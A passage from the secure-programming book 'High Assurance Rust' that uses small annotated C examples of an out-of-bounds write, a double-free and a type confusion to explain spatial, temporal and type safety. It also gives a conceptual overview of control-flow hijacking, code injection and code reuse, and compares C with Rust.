<p><strong>Exhaustion Defense</strong> - Hardening against stack overflow DoS is effective at the level of a language-agnostic pattern (MISRA C 17.2). Because it impacts overall (stack and static) space complexity at the hardware level.</p>
<ul>
<li>
<p>We can enjoy <strong>function-granular assurance</strong> with respect to a fatal runtime failure vector!</p>
</li>
<li>
<p>For <strong>whole-program assurance</strong>: this specific bug class is eliminated if we also compute worst-case stack utilization and ensure each target platform supports it<sup class="footnote-reference" id="fr-CargoCallStack-2"><a href="#footnote-CargoCallStack">6</a></sup>.</p>
</li>
</ul>
</li>
</ul>
<h2 id="takeaway-16"><a class="header" href="#takeaway-16">Takeaway</a></h2>
<p>Stack memory, our focus here, is ubiquitous and provides the runtime scaffolding for a fundamental programming abstraction: function calls.
Mechanically it works like the Last In First Out (LIFO) data structure of the same name.</p>
<p>Stack safety, a guarantee that stack space won't be exhausted at runtime, is enabled by removing recursion.
By adhering to MISRA C Rule 17.2.
But we'd still need to compute worst-case stack utilization for the entire, iterative program to make any platform-specific stack safety claim.</p>
<p>Static memory holds global variables and constant data.
It doesn't meaningfully impact stack safety.
Outside of initialization, possible mutex(s), and data-cache hit rate: static memory may have little impact on runtime.</p>
<p>In the next section, we'll explore breaking more general kinds of safety - <strong>memory safety</strong> and <strong>type safety</strong> - from the perspective of an attacker.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a></p>
</li>
<li id="footnote-CSAPP">
<p><a href="https://amzn.to/3IBnFA7"><em><strong>[PERSONAL FAVORITE]</strong> Computer Systems: A Programmer's Perspective</em></a>. Randal Bryant, David O'Hallaron (2015). <a href="#fr-CSAPP-1">↩</a></p>
</li>
<li id="footnote-Inlining">
<p>This isn't always true. One possible optimization a modern compiler may make is called "function inlining" - pulling the function body of the callee into the function body of the caller, as if the programmer had written a single, long function. For functions called in a "hot loop" (many loop iterations executed), this can increase performance by avoiding the small overhead associated with pushing a stack frame each loop iteration to make a call. The tradeoff is binary size: each source-level call site to the inlined function must be a full copy of the code (since no central location is called into). Though seldom necessary, Rust's <code>inline</code> attribute macro<sup class="footnote-reference" id="fr-RustInlineMacro-1"><a href="#footnote-RustInlineMacro">9</a></sup> allows you to control this specific behavior. <a href="#fr-Inlining-1">↩</a> <a href="#fr-Inlining-2">↩2</a></p>
</li>
<li id="footnote-Memset">
<p><a href="https://man7.org/linux/man-pages/man3/memset.3.html"><em><code>memset</code></em></a>. Linux manual (Accessed 2022). <a href="#fr-Memset-1">↩</a></p>
</li>
<li id="footnote-Zeroize">
<p><a href="https://crates.io/crates/zeroize"><em><code>zeroize</code></em></a>. Tony Arcieri (Accessed 2022). <a href="#fr-Zeroize-1">↩</a></p>
</li>
<li id="footnote-CargoCallStack">
<p><a href="https://github.com/japaric/cargo-call-stack"><em>`cargo-call-stack</em></a>. japaric (Accessed 2023). <a href="#fr-CargoCallStack-1">↩</a> <a href="#fr-CargoCallStack-2">↩2</a></p>
</li>
<li id="footnote-GenCompVer">
<p>We used <code>rustc</code> v1.71 with <code>-C "opt-level=z"</code>. <a href="#fr-GenCompVer-1">↩</a></p>
</li>
<li id="footnote-PBA">
<p><a href="https://amzn.to/3wvtCwa"><em><strong>[PERSONAL FAVORITE]</strong> Practical Binary Analysis: Build Your Own Linux Tools for Binary Instrumentation, Analysis, and Disassembly</em></a>. Dennis Andriesse (2018). <a href="#fr-PBA-1">↩</a></p>
</li>
<li id="footnote-RustInlineMacro">
<p><a href="https://doc.rust-lang.org/reference/attributes/codegen.html#the-inline-attribute"><em>The Rust Reference: The <code>inline</code> attribute</em></a>. The Rust Team (Accessed 2022). <a href="#fr-RustInlineMacro-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="an-attackers-perspective-breaking-safety-1-of-2"><a class="header" href="#an-attackers-perspective-breaking-safety-1-of-2">An Attacker's Perspective: Breaking Safety (1 of 2)</a></h1>
<p>Let's start from first principles: data is code<sup class="footnote-reference" id="fr-DataCode-1"><a href="#footnote-DataCode">1</a></sup>.
Many abstractions attempt to enforce a logical separation as follows:</p>
<ul>
<li><strong>Data</strong> - Information we can read or write.</li>
<li><strong>Code</strong> - Information we can execute.</li>
</ul>
<p>But the separating abstraction might one or more of:</p>
<ol>
<li>
<p>Vulnerable by design (high-level error).</p>
</li>
<li>
<p>Vulnerable in implementation (low-level error).</p>
</li>
<li>
<p>Vulnerable via environmental interaction (fault injection, side-channels, etc).</p>
</li>
</ol>
<p>If a motivated adversary builds an <strong>exploit</strong> for one of the 3 classes of vulnerability, or chains together several classes, they've likely found a way to treat <em>data they control</em> as some form of <em>executable, logical code</em>.</p>
<p>More generally, Sergey Bratus defines exploitation as<sup class="footnote-reference" id="fr-BratusTalk-1"><a href="#footnote-BratusTalk">2</a></sup>:</p>
<blockquote>
<p>Causing a (complex) computer or human-computer system to behave contrary to the trust assumptions and/or expectations of its designers or operators.</p>
</blockquote>
<p>"Trust assumptions", in an exploitation context, are beliefs we have about a system meeting specific security or functionality requirements.
In the prior section we saw how breaking stack safety undermines availability.</p>
<p>Say we believe that a system protects confidentiality.
Under this trust assumption, any unauthenticated or unprivileged entity being able to <em>read</em> sensitive data (secrets, intellect property, user PII, etc) is a viable attack.
That's still treating data as data.
Just with the wrong access controls.
But the most devastating attacks tend to take some <em>action</em>, treating data as code.</p>
<p>If an attacker gains code execution, whether arbitrary or constrained, they may violate almost <em>any</em> trust assumption.
Be it confidentiality, integrity, availability, etc.
The attacker's capability is generalized.</p>
<p>This is the topic of upcoming sections - introductory <strong>exploit development</strong> for memory corruption vulnerabilities (implementation problem, vulnerability class #2 above).</p>
<p>Remember: Data. Is. Code.</p>
<h2 id="at-a-high-level-how-is-code-data-isolation-broken"><a class="header" href="#at-a-high-level-how-is-code-data-isolation-broken">At a high level, how is code-data isolation broken?</a></h2>
<p>To create native executables, compilers emit data in an encoding understood only by a CPU that's happy to blindly execute it as code.
One arbitrary chunk at a time.
That's [a dramatization of] the fetch/decode/execute cycle we discussed earlier.</p>
<p>Danger is kept in check by the fact that a single number, the value of the Instruction Pointer (IP), stays within expected bounds and performs the expected logic sequence.
<em>Most</em> of the time, anyway.
Creative attackers can, and do, find ways to control contents of the IP register.
The technical term is <em>control-flow hijacking</em>, and it's the result of breaking data-code isolation.</p>
<p>Before we dive into exploitation in detail, let's discuss root cause.
Recall the term "value" refers to a concrete instance of typed data in a program: an integer, a string, a structure, a class with inherited methods, etc.
Binary exploitation often requires breaking a value's safety assumptions.
That means violating either one or both of:</p>
<ol>
<li>
<p><strong>Memory Safety</strong> - Requires both spatial and temporal safety, defined as:</p>
<ul>
<li>
<p><strong>Spatial Memory Safety</strong> - All accesses of a value to remain within correct bounds.</p>
</li>
<li>
<p><strong>Temporal Memory Safety</strong> - A value must be valid at time-of-access (e.g. initialized but not yet deallocated).</p>
</li>
</ul>
</li>
<li>
<p><strong>Type Safety</strong> - Requires that a value only be accessed as its correct type (semantics), and only by code authorized to do so (visibility).</p>
</li>
</ol>
<p>Now "binary exploitation" refers specifically to attacking natively compiled programs - sometimes without access to the original source code.
Be it C, C++, or <code>unsafe</code> Rust.</p>
<p>For a more concrete discussion of memory and type safety, we'll examine three C snippets and visualize the violations therein. Note:</p>
<ul>
<li>None of the three snippets are, to the best our knowledge, <em>exploitable</em>. These small programs break safety, but not in manner unfortunate enough to enable a break of data-code isolation.</li>
</ul>
<p>This distinction is intensional.
We're starting by learning to identify bugs, even if innocuous.
We'll build up to exploiting vulnerabilities.</p>
<h2 id="breaking-spatial-memory-safety-value-bounds"><a class="header" href="#breaking-spatial-memory-safety-value-bounds">Breaking Spatial Memory Safety (Value Bounds)</a></h2>
<p>Consider this short C program:</p>
<pre><code class="language-c">#include &lt;assert.h&gt;     // assert
#include &lt;stdio.h&gt;      // puts
#include &lt;string.h&gt;     // strncpy
#include &lt;stdlib.h&gt;     // malloc

char* get_greeting() {
    char* greeting = (char*)malloc(6);
    if (greeting == NULL) {
        return NULL;
    } else {
        strncpy(greeting, "Hello", 6);
        assert(greeting[5] == '\0');
        return greeting;
    }
}

int main() {
    char* greeting = get_greeting();
    if (greeting != NULL) {
        // Buffer overwrite, spatial safety violation!
        greeting[12] = '!';

        puts(greeting);
        free(greeting);
    }
    return 0;
}
</code></pre>
<p>There's actually quite a bit of C-specific minutia packed into that tiny snippet.
Let's break it down:</p>
<ul>
<li>
<p><code>get_greeting()</code> returns a <em>heap-allocated</em> string by reference (using a raw pointer). Strings in C are null-terminated, meaning they must end with the byte literal <code>/0</code>, a "null byte". And C string handling is notoriously error-prone. This function correctly takes a careful sequence of steps:</p>
<ul>
<li>
<p>Allocate <code>6</code> bytes on the heap via a call to <code>malloc()</code>, the standard library's memory allocator (<code>std</code> Rust uses this same API on your behalf!). <code>6</code> is the minimum length needed to store the ASCII string <code>Hello</code> and its null terminator.</p>
</li>
<li>
<p><code>malloc()</code> can return a <code>NULL</code> pointer if heap memory is already full (exhaustion) or if the allocation requested is too large to fit within memory remaining (fragmentation). We've remembered to handle this important edge case by implicitly propagating the error to the caller - similarly returning <code>NULL</code>.</p>
</li>
<li>
<p>If <code>malloc()</code> succeeds, it returns a heap-allocated buffer of the requested size. We copy the string <code>Hello</code>. <code>strncpy()</code> (which takes a maximum number of bytes to copy, <code>6</code> here) is a "best-practice" safe variant of the unsafe <code>strcpy()</code> function (which keeps copying data until a <code>NULL</code> byte is reached, often leading to spatial violations).</p>
</li>
<li>
<p><code>strncpy()</code> will include the null byte if doing so doesn't exceed the input maximum length specified. But, to be extra cautious, check that the string has been null-terminated using an <code>assert()</code>. Attempting to print an unterminated-string could result in <em>leaking sensitive data</em>. Because we'd keep printing adjacent bytes until a <code>/0</code> is reached!</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>The Implications of Library Abstraction Design</strong></p>
<p>Safe Rust doesn't require us to bear as much memory-representation cognitive load when handling strings.
With <code>std::string::String</code><sup class="footnote-reference" id="fr-String-1"><a href="#footnote-String">3</a></sup> we don't have to worry about manual allocation, copying specific lengths, null-termination, or encoding.</p>
<p>To some extent, this is also true of modern C++'s <code>std::string</code> class<sup class="footnote-reference" id="fr-CppString-1"><a href="#footnote-CppString">4</a></sup>!</p>
</blockquote>
<ul>
<li>
<p>Unfortunately, <code>get_greeting()</code>'s caller - <code>main()</code> - isn't as careful. Here we incorrectly assume that the greeting string is <code>Hello World</code>, 11 characters long. We then attempt to add an exclamation mark as the 12th character before printing the greeting with <code>puts()</code>.</p>
<ul>
<li>
<p>Due to a length mismatch, the statement <code>greeting[12] = '!';</code> is writing past the bounds of the heap allocated buffer, <em>corrupting</em> memory of any value that may just happen to be stored in the adjacent heap location at the time. This is an <strong>out-of-bounds write</strong>. A bug - not vulnerability - in this case, since the data written isn't attacker-controlled.</p>
<ul>
<li>Note: If <code>greeting</code> was indeed 11 characters long and null-terminated, <code>greeting[12] = '!';</code> would be overwriting the <code>NULL</code> byte, creating the aforementioned data leak at <code>puts()</code>. So there's an error here regardless. We'll write out the correct <code>!</code> append logic in the next example.</li>
</ul>
</li>
<li>
<p>Finally, in C we must remember to manually <code>free()</code> the memory allocated for the string - despite the <code>get_greeting()</code> function making the original allocation. Without ownership, there's no enforced contract for who frees memory and when. Forgetting leads to <strong>memory leaks</strong> (not data leaks - availability problem, not confidentiality), freeing too early can create <strong>use-after-free (UAF)</strong> bugs (potentially exploitable), and accidentally freeing more than once is a <strong>double-free</strong> (as we'll see later on).</p>
</li>
</ul>
</li>
</ul>
<p>The above program will compile without error and, despite containing a spatial safety violation, will run to completion.
It outputs:</p>
<pre><code class="language-ignore">Hello
</code></pre>
<p>At least on our personal machine, last we checked - this is a UB "time bomb" that may go off on change of platform/toolchain.
The overwrite broke spatial memory safety, we can no longer have confidence in the functionality of this program.</p>
<p>Visually, statement <code>greeting[12] = '!';</code> (an out-of-bounds write) triggers memory corruption like so:</p>
</br>
<p align="center">
  <img width="80%" src="chp4/safety_spatial_grow_up.svg">
  <figure>
  <figcaption><center>Buffer overwrite: spatial memory safety violation.</center></figcaption><br>
  </figure>
</p>
<blockquote>
<p><strong>What are the Prerequisites to a Similar Bug being Exploitable?</strong></p>
<p>The classic "buffer overflow" is an example of an exploitable, spatial vulnerability.
It involves overwriting multiple sequential bytes, beyond a buffer's capacity.
Not just one fixed byte (<code>!</code>) at a fixed offset (<code>12</code>) - like our buffer overwrite example.</p>
<p>Why does this distinction matter?
Because of a key detail in the stack's control-flow implementation.
For function calls to return, compiled code places a return addresses at the top of each stack frame (push the <code>IP</code> register onto stack).
On exit of a function this stored value is popped into the Instruction Pointer.
This allows the CPU to reach the next statement following a completed function call.</p>
<p>Before the use of compiler-inserted "stack canaries" (an exploit mitigation that inserts a random value before the return address and verifies it on function exit) buffer overflow vulnerabilities were trivially exploitable.
The attacker could turn data to code just by writing a string long enough to overwrite the return address (control flow metadata used by the CPU).
That is:</p>
</br>
<p align="center">
<img width="100%" src="chp4/safety_buffer_overflow.svg">
<figure>
<figcaption><center>A classic stack buffer overflow exploit.</center></figcaption><br>
</figure>
</p>
</blockquote>
<h2 id="breaking-temporal-memory-safety-value-validity"><a class="header" href="#breaking-temporal-memory-safety-value-validity">Breaking Temporal Memory Safety (Value Validity)</a></h2>
<p>Say we left <code>get_greeting()</code> unchanged and updated <code>main()</code> to fix the prior spatial bug.
But the refactor introduced a new temporal bug!</p>
<blockquote>
<p><strong>Refactoring Requires Care</strong></p>
<p>In professional software engineering, refactoring existing code often has important benefits.
But it also risks introducing new bugs.
Test suites and architecture patterns can reduce that risk, but cannot eliminate it for any non-trivial codebase.</p>
<p>Refactor-heavy Pull Requests (PRs) are a great time to do security-specific code review.</p>
</blockquote>
<!-- fn get_greeting() -> String {
    String::from("Hello")
}

fn main() {
    let mut greeting = get_greeting();
    greeting.push('!');
    println!("{}", greeting);
} -->
<pre><code class="language-c">int main() {
    char* greeting = get_greeting();
    if (greeting != NULL) {
        // Append "!" correctly
        size_t greeting_len = strlen(greeting); // Excludes null byte
        greeting = (char*)realloc(greeting, greeting_len + 2);
        if (greeting != NULL) {
            // strcat could be used here instead of the two lines below
            greeting[greeting_len] = '!';
            greeting[greeting_len + 1] = '\0';
        }
        puts(greeting);
        free(greeting);
    }

    // Double-free, temporal safety violation!
    free(greeting);
    return 0;
}
</code></pre>
<ul>
<li>
<p>This time, we remembered that appending to a string in C requires manually re-allocating  the backing memory (via <code>realloc()</code>). We no longer assume an 11-character <code>Hello World</code> return, instead we compute the string's length dynamically via <code>strlen</code>.</p>
<ul>
<li>
<p>We make sure to call <code>strlen</code> after checking that <code>greeting</code> is non-null, otherwise it would dereference a null pointer, resulting in UB.</p>
</li>
<li>
<p>As a quirk, the reported length doesn't include the null-terminator (although it must be present for <code>strlen</code> to report a correct result). That's why we call <code>realloc</code> with <code>greeting_len + 2</code> - accounting for both the space to add <code>!</code> and to append a new null byte.</p>
</li>
<li>
<p>If we forgot this detail and use <code>greeting_len + 1</code>, our code would again trigger a buffer overwrite due to an off-by-one error! Remember - string handling is fraught with peril in C.</p>
</li>
</ul>
</li>
<li>
<p>Re-allocation can fail, so we again check for a <code>NULL</code> return. If <code>realloc()</code> succeeds, we correctly append both <code>!</code> and the necessary null-terminator. Then print and free the modified string.</p>
</li>
<li>
<p>Despite being so close to getting everything right, we make a critical mistake at the end: freeing <code>greeting</code> again. A <em>double-free</em> bug. The same chunk of memory should never be deallocated twice. This subtle error can have serious side effects.</p>
</li>
</ul>
<p>But we dodged another bullet today.
Although this program compiles without warning, the double-free error is caught at runtime (on Ubuntu 20.04 with <code>glibc</code> 2.31):</p>
<pre><code class="language-ignore">Hello!
free(): double-free detected in tcache 2
Aborted (core dumped)
</code></pre>
<p>Visually, the two frees are sequential events in time.
The second free was successfully detected as a fatal error:</p>
</br>
<p align="center">
  <img width="90%" src="chp4/safety_temporal_grow_up.svg">
  <figure>
  <figcaption><center>double-free: temporal memory safety violation.</center></figcaption><br>
  </figure>
</p>
<p>An early abort would be jarring for an end-user.
And potentially result in down-time for a back-end service.
But runtime detection could prevent an exploit!
We got lucky here - this <em>particular</em> double-free was caught by our <em>specific</em> memory allocator<sup class="footnote-reference" id="fr-TCache-1"><a href="#footnote-TCache">5</a></sup>, which ships with a recent version of <code>glibc</code>.
Per <code>glibc</code>'s Wiki<sup class="footnote-reference" id="fr-MallocInternals-1"><a href="#footnote-MallocInternals">6</a></sup>:</p>
<blockquote>
<p>The malloc subsystem undertakes reasonable attempts to detect heap corruption throughout the code.
Some checks detect errors consistently (e.g., passing a pointer which is not sufficiently aligned to free).
However, most checks are heuristic and can be fooled...heap corruption may go unnoticed for some time, or might not be reported at all.</p>
</blockquote>
<p>In other words, the double-free in our example snippet happened to be detected by a heuristic in <code>glibc</code>'s allocator implementation.
It may not have been caught on a different platform using an older or simpler allocator.
Moreover, double-free bugs involving larger allocation requests in more complex sequences may never be caught.</p>
<p>Why?
Unlike Rust's static ownership verification, dynamic invariant checks have a runtime cost.
Allocators need to balance performance and security, yet are often forced to favor the former.
Realistically, invariant checks may be any combination of:</p>
<ul>
<li>"Best-effort" (no guarantee, low assurance) in nature (unlike a type system!)</li>
<li>Disabled by default.</li>
<li>Trading off availability guarantees (<code>assert</code> failure panics).</li>
<li>Reliant on randomization for probabilistic defense.</li>
<li>Reserved only for [often slower] "hardened" allocators.</li>
<li>Bypassable due to implementation or design flaws.</li>
</ul>
<p>We'll cover heap mechanics in greater depth later in this chapter.
And exploit a double-free vulnerability backed by a simpler allocator.
Modern heap exploitation, attacking up-to-date <code>glibc</code> and its contemporaries, is an art and science beyond our scope.
Other free resources exist for those who wish to dive those depths<sup class="footnote-reference" id="fr-How2Heap-1"><a href="#footnote-How2Heap">7</a></sup>.</p>
<blockquote>
<p><strong>Availability Robustness: The Rust Port Isn't Strictly Better</strong></p>
<p>The <code>!</code> appending version in Rust may seem perfectly safe and pleasantly readable by comparison:</p>
<pre><pre class="playground"><code class="language-rust">fn get_greeting() -&gt; String {
    String::from("Hello")
}

fn main() {
    let mut greeting = get_greeting();
    greeting.push('!');
    println!("{}", greeting);
}</code></pre></pre>
<p>Ownership takes care of memory allocation and deallocation, the <code>String</code> type abstracts reallocation.
And we don't have to worry about null-termination, since that's not true of Rust strings (unless we using <code>std::ffi::CString</code><sup class="footnote-reference" id="fr-CString-1"><a href="#footnote-CString">8</a></sup>  specifically for interoperability with C external code).</p>
<p>But not all ergonomics are free.
<code>libc</code>'s <code>malloc</code> still gets called when heap allocating the <code>String</code>.
A raw buffer pointer is still returned.
Yet we didn't get a chance to <code>NULL</code>-check it ourselves.
The Rust port is arguably less robust than the C version:</p>
<ul>
<li>
<p>Rust's <code>fn get_greeting()</code> will <code>panic!</code> if system memory is exhausted. It's an infallible interface to a fallible operation!</p>
</li>
<li>
<p>C's <code>char* get_greeting()</code> won't terminate on exhaustion - it propagates that error [implicitly] via a <code>NULL</code> return value. That gives the caller a chance to handle the fallible operation with business-appropriate logic.</p>
</li>
</ul>
<p>How realistic is running out of memory on a modern system when allocating a 5-6 character string?
Probably more than you'd expect.</p>
<p>If a long-running process, like a web server, ever forgets to free even a single, hot-path allocation then memory usage will increase, potentially linearly, with time.
Making exhaustion inevitable.
If those leaked allocations are triggered by processing external requests, an attacker can force early exhaustion to deny service.</p>
<p>Now memory leaks are largely prevented in safe Rust.
But they're still possible if misusing cyclical references or calling <code>unsafe</code> code.</p>
</blockquote>
<h2 id="breaking-type-safety-low-level-value-semantics"><a class="header" href="#breaking-type-safety-low-level-value-semantics">Breaking Type Safety (Low-level Value Semantics)</a></h2>
<p>Given our previous troubles with spatial and temporal memory safety, we've decided to give up on appending the <code>!</code> at runtime and simply hardcode a <code>Hello!</code> string.
Free of string-handling perils, we can focus on an exciting new feature: adding a user record<sup class="footnote-reference" id="fr-CWE843-1"><a href="#footnote-CWE843">9</a></sup>.</p>
<p>Our feature has two functional requirements:</p>
<ol>
<li>New users should be greeted with <code>Hello!</code></li>
<li>Visit count for existing users should be tracked.</li>
</ol>
<p>To support these requirements, we add a user record structure:</p>
<pre><code class="language-c">#define TYPE_NEW_USR 1 // New user, to be greeted
#define TYPE_CUR_USR 2 // Current user, increment visit count

struct user_record_t {
    int type;
    union {
        char *greeting;
        unsigned visit_count;
    };
};
</code></pre>
<ul>
<li>
<p>The <code>#define</code> lines are C preprocessor directives, aka "macros". They tell the compiler to replace all instances of the uppercase constant name with the corresponding constant value, e.g. <code>TYPE_NEW_USR</code> is replaced with <code>1</code> wherever it appears<sup class="footnote-reference" id="fr-PreTrick-1"><a href="#footnote-PreTrick">10</a></sup> in the source. C macros can have "hygiene" pitfalls<sup class="footnote-reference" id="fr-HygienicMacro-1"><a href="#footnote-HygienicMacro">11</a></sup>, but those aren't relevant here. Typing is weaker than a Rust <code>enum</code> with two variants (why do you think that is? There may be multiple answers).</p>
</li>
<li>
<p><code>user_record_t</code> is a C structure. It represents either a new user or an existing user (but not both simultaneously). The <code>union</code> field allows us to store different data types in the same memory location - here a string pointer (<code>char*</code>) for a new user's greeting and an unsigned integer (<code>unsigned</code>) for an existing user's visit count.</p>
</li>
</ul>
<p>An updated <code>main</code> function leveraging <code>struct user_record_t</code>:</p>
<pre><code class="language-c">int main() {
    struct user_record_t rec;

    rec.type = TYPE_NEW_USR;
    rec.greeting = "Hello!";

    // Logic error: should be `TYPE_CUR_USR`
    if (rec.type == TYPE_NEW_USR) {
        rec.visit_count += 1; // Type confusion, a type safety violation!
    }

    if (rec.type == TYPE_NEW_USR) {
        printf("%s\n", rec.greeting);
    }

    return 0;
}
</code></pre>
<p>Something <em>weird</em> happens when we run the above <code>main</code> function.
The program prints a greeting, but we're missing the leading <code>H</code> - almost like a casual shorthand:</p>
<pre><code class="language-ignore">ello!
</code></pre>
<p>What actually occurred at runtime?
Due to a type safety bug, we accidentally incremented a string pointer (instead of a count integer) by one, causing it to point to the next byte (<code>e</code> instead of <code>H</code>).
This is possible because of:</p>
<ol>
<li>The bug being present.</li>
<li>Intentional operator overloading support (pointer arithmetic is an important feature of C).</li>
<li><code>union</code> backing different data types with the same memory location.</li>
</ol>
<p>It seems like this shouldn't be legal.
But these mechanisms underpin the "raw" power of C - unions and pointer arithmetic can enable clever optimizations.
In fact, a major usecase for <code>unsafe</code> Rust is enabling similar optimizations.</p>
<p>Visually, the type confusion plays out like so:</p>
</br>
<p align="center">
  <img width="80%" src="chp4/safety_type_grow_up.svg">
  <figure>
  <figcaption><center>Type confusion: type safety violation.</center></figcaption><br>
  </figure>
</p>
<p>There's a detail not reflected in the above diagram (for simplicity).
In the memory safety examples, our dynamic string <code>Hello!</code> was heap allocated at runtime.
In this type safety example, it happens to be hardcoded and thus stored in static memory.</p>
<blockquote>
<p><strong>What if we're not talking about binaries?</strong></p>
<p>We're focused on binary exploitation in this chapter, but that the data-is-code concept applies generally.
Let's pick on Java for a moment.</p>
<p>The Java language is ubiquitous in enterprise and shares its runtime with languages like Kotlin, Clojure, and Scala.
Java-family programs are compiled to bytecode executed by the Java Virtual Machine (JVM), which is itself a natively compiled program that runs on the CPU.</p>
<p>This indirection, coupled with garbage collection, has performance costs.
But, in exchange, Java and its ilk are both memory-safe and type-safe.
That doesn't mean they aren't exploitable.
Consider:</p>
<ul>
<li>
<p><strong>Serialization attacks</strong> - deserializing attacker-controlled data into a specific in-memory structure (which can sometimes additionally enable type confusion).</p>
<ul>
<li>See CVE-2023-25194<sup class="footnote-reference" id="fr-KafkaCVE-1"><a href="#footnote-KafkaCVE">12</a></sup>, an RCE in Apache Kafka.</li>
</ul>
</li>
<li>
<p><strong>Command injection attacks</strong> - passing arbitrary, attacker-specified commands directly to a host system's shell for execution.</p>
<ul>
<li>See CVE-2021-44228<sup class="footnote-reference" id="fr-Log4J-1"><a href="#footnote-Log4J">13</a></sup>, aka "Log4J" or "Log4Shell", an extremely widespread RCE in Apache Log4j.</li>
</ul>
</li>
</ul>
<p>Binary exploitation is a fantastic lens through which to understand how system memory works.
But many software developers and security engineers aren't writing native applications.</p>
<p>We recommend self-guided exploration of non-binary attacks.
For good measure, we'll briefly cover more Log4J details in the next section.</p>
</blockquote>
<h2 id="why-do-attackers-break-code-data-isolation"><a class="header" href="#why-do-attackers-break-code-data-isolation">Why do attackers break code-data isolation?</a></h2>
<p>Regardless of source language, binary exploits break memory safety, type-safety, or some combination of both.
Once safety is broken, Undefined Behavior (UB) is triggered.
A language's operational semantics go out the window.
The program can execute arbitrary operations that aren't reflected in the faulty source code or valid per the language specification.
This creates room for an exploit developer to:</p>
<ul>
<li>
<p><strong>Hijack control-flow</strong> - Redirect execution of the program by setting the value of the Instruction Pointer (IP).</p>
<ul>
<li>This is a key "building block" in powerful exploits (excluding data-oriented attacks<sup class="footnote-reference" id="fr-DOA-1"><a href="#footnote-DOA">14</a></sup>, a niche). In limited cases, control-flow hijack alone enables a useful malicious operation (perhaps calling an existing function without arguments, if the function has some desirable side-effect).</li>
</ul>
</li>
<li>
<p><strong>Inject code</strong> - Write an executable memory location to add new code or modify existing code. If control-flow can be hijacked to execute the newly/added modified code, the attacker is free to reprogram the victim process arbitrarily.</p>
<ul>
<li>Modern hardware/OS combos store executable code in read-only memory to prevent code injection. But it's still a major attack vector for resource-constrained embedded systems without this protection<sup class="footnote-reference" id="fr-DeepMitigations-1"><a href="#footnote-DeepMitigations">15</a></sup>. And applications supporting Just-In-Time compilation, like JavaScript engines used in major web browsers<sup class="footnote-reference" id="fr-JITSoK-1"><a href="#footnote-JITSoK">16</a></sup>.</li>
</ul>
</li>
<li>
<p><strong>Reuse code</strong> - Stitch together many small snippets of existing code, called "gadgets", to generate semi-arbitrary sequences of operations<sup class="footnote-reference" id="fr-XGadget-1"><a href="#footnote-XGadget">17</a></sup>. Less general than code injection, in both computation flexibility and exploit stability, but often effective.</p>
<ul>
<li>Code-reuse attacks are viable for most modern software: it bypasses common mitigations. But defenses do exist. We'll discuss defenses later in this chapter and cover Return-Oriented Programming (ROP) - the most popular class of code-reuse attack - in a future appendix section.</li>
</ul>
</li>
</ul>
<h2 id="takeaway-17"><a class="header" href="#takeaway-17">Takeaway</a></h2>
<p>Violating memory safety (spatial or temporal) and/or type safety destroys security and functionality assurance.
Because it breaks isolation between attacker-controlled <em>data</em> and host-executed <em>code</em>.
Safety vulnerabilities can give an attacker control over a victim's software.</p>
<p>Once an attacker gains control of a process, they leverage their foothold to further malicious objectives.
Disrupting services, exfiltrating sensitive data, installing malware, etc.
A seemingly minor vulnerability may lead to major business or mission impact.</p>
<p>This introduction to an attacker's perspective focuses on the low-level, with code snippets and memory/type safety violation mechanics.
In the long-term, it can be helpful to understand exploitation more abstractly - to build a framework for <em>reasoning</em> about these kinds of threats.
Such a conceptualization is more general, it translates beyond binary attacks.
That's our next topic!</p>
<hr>
<ol class="footnote-definition"><li id="footnote-DataCode">
<p>"Code is data" or "data is code" is an adage popular with Lisp programmers. Technically, any programming language's code is data - all interpreters and compilers parse files which encode some data. But for Lisp-like languages, any well-formed program's source code is <em>also</em> a valid data structure called an "S-expression". Because S-expressions are core to the language itself, Lisp programs have a property called <em>homoiconicity</em><sup class="footnote-reference" id="fr-Homoicon-1"><a href="#footnote-Homoicon">18</a></sup> - the programs can be manipulated as data. This enables rich meta-programming capabilities, which are one influence for Rust's macro system.
Coming back to exploitation, we can think of memory corruption exploits as a weird kind of meta-programming. <a href="#fr-DataCode-1">↩</a></p>
</li>
<li id="footnote-BratusTalk">
<p><a href="https://www.youtube.com/watch?v=Dd9UtHalRDs"><em>What Hacker Research Taught Me</em></a>. Sergey Bratus (2011). <a href="#fr-BratusTalk-1">↩</a></p>
</li>
<li id="footnote-String">
<p><a href="https://doc.rust-lang.org/std/string/struct.String.html"><em>Struct <code>std::string::String</code></em></a>. The Rust Team (Accessed 2023). <a href="#fr-String-1">↩</a></p>
</li>
<li id="footnote-CppString">
<p><a href="https://cplusplus.com/reference/string/string/"><em>Class <code>std::string</code></em></a>. The C++ Team (Accessed 2023). <a href="#fr-CppString-1">↩</a></p>
</li>
<li id="footnote-TCache">
<p><code>tchache</code>, short for "thread local cache", is an internal optimization added in <code>glibc</code> version 2.26<sup class="footnote-reference" id="fr-MallocInternals-2"><a href="#footnote-MallocInternals">6</a></sup>'s <code>malloc</code> implementation. It allows faster allocations for when very small chunks of memory are requested - especially in multi-threaded programs. Our error message is extremely implementation-specific. <a href="#fr-TCache-1">↩</a></p>
</li>
<li id="footnote-MallocInternals">
<p><a href="https://sourceware.org/glibc/wiki/MallocInternals#Thread_Local_Cache_.28tcache.29"><em>Overview of Malloc</em></a>. glibc Wiki (Accessed 2022). <a href="#fr-MallocInternals-1">↩</a> <a href="#fr-MallocInternals-2">↩2</a></p>
</li>
<li id="footnote-How2Heap">
<p><a href="https://github.com/shellphish/how2heap"><code>how2heap</code></a>. Shellphish CTF team (Accessed 2022). <a href="#fr-How2Heap-1">↩</a></p>
</li>
<li id="footnote-CString">
